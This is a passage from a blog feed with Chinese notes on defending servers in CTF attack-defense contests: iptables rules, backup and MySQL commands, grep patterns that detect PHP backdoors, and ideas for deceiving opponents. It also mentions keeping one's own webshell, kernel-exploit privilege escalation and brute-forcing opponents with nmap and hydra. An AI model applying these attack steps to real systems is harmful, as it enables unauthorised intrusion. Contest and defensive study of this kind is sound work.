class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Allow youself Ping other hosts , prohibit others Ping you</span></span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br><span class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#Close all INPUT FORWARD OUTPUT, just open some ports</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line"><span class="comment">#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#Open multiport</span></span><br><span class="line"><span class="comment">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span></span><br><span class="line"><span class="comment">#Control IP connection</span></span><br><span class="line"><span class="comment">#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span></span><br><span class="line"><span class="comment">#A single IP allows up to 15 new connections in 60 seconds</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#Prevent port reuse</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="comment">#Filter abnormal packets</span></span><br><span class="line">iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP</span><br><span class="line"><span class="comment">#Prevent DoS attacks</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --limit-burst 100 -j ACCEPT</span><br><span class="line"><span class="comment">#Discard unfamiliar TCP response packs to prevent rebound attacks</span></span><br><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP </span><br></pre></td></tr></table></figure><p>复制</p><p>注意，对于不同的iptables版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。</p><p><strong>5. 综合分析控阻溢出类攻击</strong></p><p>关于溢出类攻击，我还没有总结出一些很实用的姿势，这里提供一些思路。</p><p>一般来说，溢出攻击成功后，会建立shell通道和网络连接，我们可以配合前面提到的命令，从这两方面入手进行检测和阻隔：</p><p>（1）检测高权限的进程</p><p>（2）检测sh，bash等进程</p><p>（3）检测建立的网络连接</p><p>（4）检查开放的端口</p><p>例子：通过端口和bash发现可疑进程</p><p>如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket连接数的命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l </span><br></pre></td></tr></table></figure><p>复制</p><p>比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。</p><p>我们还可以检测可疑进程开启的管道。linux下查看进程管道数的命令类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l </span><br></pre></td></tr></table></figure><p>复制</p><p>典型的一个例子是：Apache模块后门mod_rootme，它复用了webserver的80端口，mod_rootme通过管道和bash交互数据，但是由于开启了额外的管道，我们从这个变化上便能察觉到。</p><p>详细内容可以参考： <a href="http://t.qq.com/p/t/330573116082464%E3%80%82">http://t.qq.com/p/t/330573116082464。</a></p><p>总体来说，我们主要可以关注进程情况和网络连接情况，综合分析进程，阻断溢出攻击创建的shel的。</p><p><strong>6. 漏洞修复简单粗暴</strong></p><p>CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。</p><p><strong>1. 删站</strong>：如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell，参加过几场比赛确实遇到了这种尴尬的事情，web攻防最后都演变成了拼手速的“GetShell+留后门+删站”。</p><p><strong>2. 删漏洞页面</strong>：大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。</p><p><strong>3. 破坏正常功能</strong>：如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似upload等这种功能调用函数。</p><p>上面这三种其实都算不上修补漏洞了，真实环境下哪能这么干。</p><p><strong>4. 采用正常修补手段</strong>：规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。</p><blockquote><p>_&lt;&lt;&lt;&lt;&lt;&lt;</p></blockquote><p>谈到那个删站，我忍不住想吐槽几句，我个人是不赞成这种做法的，因为这种操作在比赛中很容易拉仇恨并且产生连锁反应，也不利于个人的进步。有些人认为：我先拿下这台服务器说明我有能力，你没进去就说明你没本事，所以我先进去删了站不让其他人进也无可厚非，有能耐你就先拿下它，那你删了我也没意见。也有人说，真正的对抗里，敌人不会对你仁慈～～没错，挺有道理的，而且强者也应该拥有发言权。但是我们不能只从一个角度考虑问题，换个角度去考虑，CTF竞赛虽然是向着真实的网络环境靠拢，但是它的根本目的是提高竞技者的安全技能和知识水平。对于大部分切磋竞技的玩家来说，参加比赛也都是为了让自己获得提高，大家在同一个平台上进行进行切磋对抗，认识到自己和对手身上的优点与不足，这才是竞技。但是这种行为其实从某种意义上来说已经破坏了比赛的公平性，毕竟如果是因为技术不到位，那当然没什么话说，但是如果网站删了，让别人发挥的地方都没有，这种切磋也没有意义。举个不太恰当的例子，这就像两个人打架，你说你比我强，咱们比比再说，但是你都不让我跟你打，这算什么。再换个角度，其实我一直坚信真正具有强者姿态的人，不畏惧挑战、不怕被人超越，不屑于通过这种手段巩固自己的地位。相反，我们只有将自己至于狂风大浪中，才能成长和蜕变，最终成为一个强者。</p><p>无论从什么角度考虑，我们应该敢于挑战自身、挑战别人，不断强大自己，不断去征服，无畏无惧、步履铿锵！</p><p><strong>7. 安全软件锦上添花</strong></p><p>可以使用第三方软件的话，装个WAF，安全狗之类的吧。这个我没什么话要说，附个linux安全狗的链接吧：</p><p>安全狗linux版：<a href="http://www.safedog.cn/website_safedog.html">http://www.safedog.cn/website_safedog.html</a></p><p>我们平时也可以搜集或者自己实现一些脚本或者工具备用。</p><p>这里有waf一枚：<a href="http://hackblog.cn/post/75.html">http://hackblog.cn/post/75.html</a></p><p>如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?phpnrequire_once(&#x27;/tmp/waf.php&#x27;);n/g&quot; </span><br></pre></td></tr></table></figure><p>复制</p><p>命令的意思就是查找&#x2F;var&#x2F;www&#x2F;html目录下所有php文件，在头部添加一句，用require函数引入&#x2F;tmp&#x2F;waf.php文件。因为sed命令利用 &#x2F; 区分文件中的原字符串和修改的字符串，所以我们要对 &#x2F; 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义：’，命令转换过来就是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?phpnrequire_once(&#x27;/tmp/waf.php&#x27;);n/g&quot; </span><br></pre></td></tr></table></figure><p>复制</p><p>这样，再次打开时我们就会发现已经引入了自定义waf文件。</p><p><strong>8. 我可能get了假的flag</strong></p><p>如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点“搅屎”的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于”getflag”命令，或者”curl”访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。就拿前之前的ISCC来说，这个也是我赛后想到的。这个getflag是一个elf的程序，在&#x2F;usr&#x2F;bin&#x2F;下，顺手给下载了，有兴趣的同学可以去逆向一波。重点在这，有几次我getflag的时候因为webshell丢了，服务器显示了Error。后来想想，我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢，当然我不知道是不是已经有师傅们用了这个手法。这是模拟的效果：</p><p>怎样实现？比如我们可以添加alias别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现cd，ls等命令都没法用，会怎么样呢？然而这样会不会不太好～～</p><p>最后推荐一个感觉挺实用功能很强的远程连接管理工具，可以极大方便我们的工作：<a href="https://mobaxterm.mobatek.net/">MobaXterm</a>。（不是打广告~）</p><p>它支持多种连接方式，可以拖拽进行文件管理。支持在打开的会话一键批量执行命令。</p><p>还有一个非常方便的ssh端口转发功能，支持本地、远程、动态转发。</p><p>还有很多其他功能貌似很厉害，不过我没用过，就不说了…</p><p>真不是打广告。</p><p><strong>三. 对CTF举办的一点小小建议</strong></p><p>如今CTF越来越火，对于这些比赛的举办方，我有着一些不成熟想法和小建议，如果您觉得有什么不合适的地方，纯当娱乐：</p><p>（1）扩展竞技形式：目前线下赛web攻防占绝大多数，有些小比赛甚至只有若干web服务器，上面放几个不同类型的站点，形式有些单一了，其实可以增加多种对抗模式，甚至可以让参赛选手走出比赛场地。去年曾有幸聆听了诸葛建伟博士关于打破XCTF现有格局的讲座，他提出了体系化攻防演练，认为CTF可以引入实地wifi渗透、门禁系统突破、无人机攻防、GPS信号对抗等，增加比赛多样性与趣味性，让线下赛不再只是局限于小小的机房</p><p>（2）重视安全分析与防护。安全不仅仅只是网络攻防对抗，数据分析、取证分析、应急响应、追踪溯源等技能也相当重要，并且在安全人才圈里这方面缺口也比较大。今年六月份，启明星辰主办的2017”信息安全铁人三项赛”（分为”个人逆向赛“、”数据分析赛“、”企业攻防赛“三个赛事），其中”数据分析赛“便是一个典型代表，参赛选手需要分析真实企业网络环境下受网络攻击的流量数据，从中找出攻击者、分析其网络攻击行为，如欺骗劫持、爆破、webshell连接操作等，找到并分析攻击者的后门或者恶意软件。这种模式，有助于参赛者接触到相对更加真实的网络攻击流量的对抗与防御。</p><p>（3）完善竞技模式的具体细节，尽量避免取巧或者粗暴姿势。比如拿修补漏洞举例子，现在CTF线下赛中绝大部分参赛者为了维持加固自己的shell，往往都会采用<strong>删除部分页面的方法，比如登陆、注册页面，因为采用正常打补丁、修改配置等操作都比较费时费事</strong>。但在比赛中这种方式是对于学习真正的安全加固、漏洞修补知识没有太多提高。玩CTF不应该仅仅为了比赛而比赛，或者只是为了拿个奖、拿几张证书，还是要注重从中学到点东西，不过有证书对以后就业还是有些帮助的。</p><p>虽然说这些会增加举办方的负担，给选手增加难度，但是这也是一种趋势。CTF必然要经历从普及到提高的转变，并且随着参赛选手水平的提高，我们确实需要一些更有意思的玩法，这是一个相互促进的关系。当然，对于入门级的CTF选手来说，题目难度过大反而会降低比赛体验，对于不同级别的玩家，可以设置不同级别的赛事。从形式上讲，像引入门禁系统突破、无人机攻防等，对于大部分CTF举办方来说实现起来有些难度，毕竟涉及到不同的环境、设备、人员维护等问题，所以这个不应该强求，但是对网络攻防来说增加如windows 服务器、邮件服务器、路由设备等还是可行的。以后的CTF规格和水平会越来越高，对于参赛选手的挑战难度也会越来越大，这对于举办方和选手来说都是挑战，但是挑战亦是机遇，我们应时刻准备好投入战斗！</p><p><strong>四. 最后的话</strong></p><p>虽说上面提到的这些姿势不可能让我们的靶机变得无懈可击，但是至少能在某种程度上提高它的防御值，希望能对大家有所帮助。最后，祝愿各位CTF参赛选手在比赛中勇创佳绩，同时也祝愿各单位的大佬们都能把CTF筹办的越来越好！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF线下防御战-—-让你的靶机变成“铜墙铁壁”&quot;&gt;&lt;a href=&quot;#CTF线下防御战-—-让你的靶机变成“铜墙铁壁”&quot; class=&quot;headerlink&quot; title=&quot;CTF线下防御战 — 让你的靶机变成“铜墙铁壁”&quot;&gt;&lt;/a&gt;CTF线下防御战 — 让你的</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="攻防" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下AWD攻防步骤总结</title>
    <link href="http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-09T02:05:23.134Z</published>
    <updated>2022-09-09T05:04:10.103Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF线下AWD攻防步骤总结："><a href="#CTF线下AWD攻防步骤总结：" class="headerlink" title="CTF线下AWD攻防步骤总结："></a>CTF线下AWD攻防步骤总结：</h1><p>ctf线下AWD攻防赛学习笔记：<a href="https://blog.csdn.net/qq_43442524/article/details/102653414">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102653414</a><br>CTF AWD模式下简单的CMS代码审计：<a href="https://blog.csdn.net/qq_43442524/article/details/102409351">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102409351</a></p><h2 id="AWD竞赛"><a href="#AWD竞赛" class="headerlink" title="AWD竞赛"></a>AWD竞赛</h2><p><img src="https://img-blog.csdn.net/20180920140411443?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTE0OTE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="image"></p><p>前半个小时应熟悉配置环境。准备网线、网线转接口</p><p>最好的防御就是攻击，一定要做好安全加固</p><p>本次记录的目的是为了给自己一个月来的准备弄个交代,感觉自己跟大佬们差的很远,只拿了三等,往后的路还很长,还是需要亿点点的努力,无限进步.</p><p><a href="https://github.com/PlutoaCharon/AWD-Attack-Defense">工具链接</a>:</p><p><code>https://github.com/PlutoaCharon/AWD-Attack-Defense</code></p><h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2><p>常用工具：</p><ul><li>Burpsuite</li><li>sqlmap</li><li>nmap、masscan</li><li>nc</li><li>D盾</li><li>Xshell、Xftp</li><li>菜刀或蚁剑</li><li>Chrome、Firefox各类插件</li></ul><p>一句话木马：</p><ul><li>php</li><li>asp</li><li>aspx</li><li>jsp</li><li>内存马</li></ul><p>代码比较工具:</p><p>BeyondCompare(windows)</p><p>Kaleidoscope(mac)</p><p><strong>提前准备好各种cms的poc exp （因为你们不允许联网）phpwin phpcms dz</strong></p><p><a href="https://github.com/Mr5m1th/POC-Collect">CMS_POC</a></p><h2 id="防守步骤"><a href="#防守步骤" class="headerlink" title="防守步骤"></a>防守步骤</h2><h3 id="0x00-ssh登陆，修改密码"><a href="#0x00-ssh登陆，修改密码" class="headerlink" title="0x00 ssh登陆，修改密码"></a>0x00 ssh登陆，修改密码</h3><p>普通用户提权成root，根据kernel版本号找到对应的poc，exp提权</p><h3 id="0x01-下载源码，备份，-x2F-var-x2F-www-x2F-html-目录"><a href="#0x01-下载源码，备份，-x2F-var-x2F-www-x2F-html-目录" class="headerlink" title="0x01 下载源码，备份，&#x2F;var&#x2F;www&#x2F;html 目录"></a>0x01 下载源码，备份，&#x2F;var&#x2F;www&#x2F;html 目录</h3><p>定时备份源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=&quot;/var/www/$time.tar.gz&quot;</span><br><span class="line">webdir=&quot;/var/www/html&quot;</span><br><span class="line">tar zcvf $bak_file $webdir &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line">done </span><br></pre></td></tr></table></figure><h4 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h4><p>1、找数据库配置文件，找到<code>db_name、db_user</code>和<code>db_passwd</code></p><p>2、登陆数据库，命令备份数据库:</p><p><code>mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库</code></p><p><code>cd /var/lib/mysql</code></p><p><code>mysqldump -u db_user -p db_passwd &gt; bak.sql//先进入数据库目录再备份</code></p><p><code>mysqldump --all-databases &gt; bak.sql //备份所有数据库</code></p><p>3、还原数据库：</p><p><code>mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库</code></p><p><code>cd /var/lib/mysql</code></p><p><code>mysql -u db_user db_passwd &lt; bak.sql //先进入数据库目录再还原</code></p><p>还有一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u db_name -p</span><br><span class="line">input passwd 进入mysql控制台mysql&gt;</span><br><span class="line">mysql&gt; show databases;看看有哪些数据库</span><br><span class="line">mysql&gt; create database test ; 建立要还原的数据库</span><br><span class="line">mysql&gt; use test;切换到刚创建的数据库</span><br><span class="line">mysql&gt; source test.sql; 导入数据库 </span><br></pre></td></tr></table></figure><p>关闭 MySQL 远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set host = &#x27;localhost&#x27; where user=&#x27;root&#x27; and host=&#x27;%&#x27;;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; exit; </span><br></pre></td></tr></table></figure><p>隐藏用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看home目录下是否有其他用户</span><br><span class="line">/etc/passwd是否有/bin/bash的用户 </span><br></pre></td></tr></table></figure><h3 id="0x02-扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码"><a href="#0x02-扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码" class="headerlink" title="0x02 扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码"></a>0x02 扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 简单的查找后门</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;eval(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;assert(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;system(&#x27; </span><br></pre></td></tr></table></figure><h3 id="0x03-修改数据库密码"><a href="#0x03-修改数据库密码" class="headerlink" title="0x03 修改数据库密码"></a>0x03 修改数据库密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); 或者</span><br><span class="line">update user set password = PASSWORD(&#x27;要更换的密码&#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privileges；</span><br><span class="line">show tables；可能有flag。</span><br><span class="line">select * from typecho_flag; </span><br></pre></td></tr></table></figure><h3 id="0x04-关闭不必要的端口，要求的服务端口不能关"><a href="#0x04-关闭不必要的端口，要求的服务端口不能关" class="headerlink" title="0x04 关闭不必要的端口，要求的服务端口不能关"></a>0x04 关闭不必要的端口，要求的服务端口不能关</h3><p><code>netstat -napt ，lsof -i</code> 查看端口，<br><code>kill -9 PID</code> 杀掉进程<br><code>nmap -sV ip地址</code>（-sV参数可以探测目标主机的服务器版本）<br><code>nmap</code>扫描对方开启的端口，21,22，21,3306，进行爆破</p><p><code>msfconsole</code>进入<code>metasploit</code>,<code>hydra</code>可以对22端口进行爆破</p><h3 id="0x05-代码审计，使用seay源代码审计，或者Rips代码审计"><a href="#0x05-代码审计，使用seay源代码审计，或者Rips代码审计" class="headerlink" title="0x05 代码审计，使用seay源代码审计，或者Rips代码审计"></a>0x05 代码审计，使用seay源代码审计，或者Rips代码审计</h3><p>可以参考我写的这篇博客</p><p><a href="https://blog.csdn.net/qq_43442524/article/details/101934481">Rips工具使用</a></p><h3 id="0x06-木马查杀"><a href="#0x06-木马查杀" class="headerlink" title="0x06 木马查杀"></a>0x06 木马查杀</h3><p>关于木马</p><ul><li>关注服务的可用性状况</li><li>查看文件监控情况</li><li>在被攻击的时候进行响应，保存相应的流量，查找&#x2F;清除后门</li></ul><blockquote><p>建议使用apache用户来删除</p></blockquote><h4 id="通过文件监控查看系统异常情况"><a href="#通过文件监控查看系统异常情况" class="headerlink" title="通过文件监控查看系统异常情况"></a>通过文件监控查看系统异常情况</h4><p>文件监控脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#use: python file_check.py ./</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import ntpath</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典</span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"># 特殊文件路径字符串</span><br><span class="line">Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br><span class="line">bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br><span class="line">logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><span class="line"></span><br><span 